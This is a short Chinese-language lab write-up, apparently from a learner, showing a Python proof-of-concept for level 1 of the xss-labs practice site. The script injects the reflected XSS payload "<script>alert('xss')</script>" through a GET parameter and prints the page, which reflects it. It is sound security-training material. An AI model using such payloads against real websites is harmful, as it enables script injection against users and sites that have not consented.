# POC编写

用python完成xss-labs-level1的POC编写

```python
import requests

#目标URL
url = "http://xss-labs/level1.php"

#设置headers头
headers = {'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0"}

#包含恶意脚本的参数
payload = "<script>alert('xss')</script>"

#用params参数传递GET参数
params = {"name":payload}

#发送GET请求
response = requests.get(url=url,
                      params=params,
                      headers=headers,
                      timeout=5)
#检查payload是否插入
print(response.text)

#检查响应中是否包含恶意脚本
if payload in response.text:
    print("存在XSS漏洞")
else:
    print("不存在XSS漏洞")
```

运行

```bash
D:\Scripts\python.exe "D:\Tools\PyCharm\PyCharmProject\py_project01\xss-labs-level1(1).py" 
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
</script>
<title>欢迎来到level1</title>
</head>
<body>
<h1 align=center>欢迎来到level1</h1>
<h2 align=center>欢迎用户<script>alert('xss')</script></h2><center><img src=level1.png></center>
<h3 align=center>payload的长度:29</h3></body>
</html>





存在XSS漏洞

进程已结束，退出代码为 0
```

